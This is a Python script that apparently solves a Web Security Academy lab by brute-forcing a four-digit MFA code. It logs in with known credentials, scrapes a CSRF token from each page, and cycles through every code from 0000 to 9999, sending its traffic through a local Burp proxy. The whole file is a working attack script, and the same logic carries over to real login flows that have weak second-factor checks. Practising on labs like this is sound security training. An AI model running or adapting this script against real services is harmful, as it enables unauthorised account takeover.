import requests
from bs4 import BeautifulSoup


ca_cert_path = "certs/burp_cacert_chain.pem"
base_url = "https://0a07005403a7a88e80dc3f330024007b.web-security-academy.net"
endpoints = ["/login", "/login2"]
username = "carlos"
password = "montoya"
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
})
session.proxies.update({
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
})

def get_csrf_token(response):
    """Retrieve CSRF token from the specified URL."""
    try:
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})
        if csrf_token is None or "value" not in csrf_token.attrs:
            print(f"Failed to retrieve CSRF token from {response.url}. Retrying...")
            return None
        return csrf_token["value"]
    except Exception as e:
        print(f"Error parsing CSRF token from {response.url}: {e}")
        return None
    

mfa_codes = [f"{i:04d}" for i in range(10000)]  # Generate codes 0000-9999
last_code_attempted = None
found_flag = False

for mfa_code in mfa_codes:
    response = session.get(f"{base_url}{endpoints[0]}", verify=ca_cert_path, timeout=10)
    csrf_token = get_csrf_token(response)
    if int(mfa_code) % 250 == 0:
        print(f"CSRF token at /login endpoint: {csrf_token}")
        print(f"Status code: {response.status_code}")

    payload = {"csrf": csrf_token, "username": username, "password": password}
    response = session.post(f"{base_url}{endpoints[0]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
    if int(mfa_code) % 250 == 0:
        print(f"Entering login credentials... using session cookies: {session.cookies.get_dict()}")
        print(f"Status code: {response.status_code}")

    if response.status_code != 302:  # Login failed
        print(f"Login failed with status {response.status_code}. Try again.")
        break
            
    response = session.get(f"{base_url}{endpoints[1]}", verify=ca_cert_path, timeout=10)
    csrf_token = get_csrf_token(response)
    if response.status_code == 400:
        print(response.status_code)
        break
    if int(mfa_code) % 250 == 0:
        print(f"Credentials verified. MFA code sent to email. CSRF token: {csrf_token}")
        print(f"Status code: {response.status_code}")

    payload = {"csrf": csrf_token, "mfa-code": mfa_code}
    response = session.post(f"{base_url}{endpoints[1]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)
    if int(mfa_code) % 250 == 0:
        print(f"Brute-forcing with generated MFA code: {mfa_code}, Status: {response.status_code}")
        print(f"Session cookies: {session.cookies.get_dict()}")
            
    if response.status_code == 302:  # Successful MFA bypass
        found_flag = True
        last_code_attempted = mfa_code
        break
    elif response.status_code == 400:  # Too many attempts or invalid
        print("Too many failed attempts. Aborting...")
        break

if found_flag:
    print(f"Successfully bypassed MFA with brute-force. Code: {last_code_attempted}")
else:
    print("No valid MFA code found. Brute-force attack unsuccessful.")
    print(f"Last code attempted: {last_code_attempted}")
    
print("Closing session...")
session.close()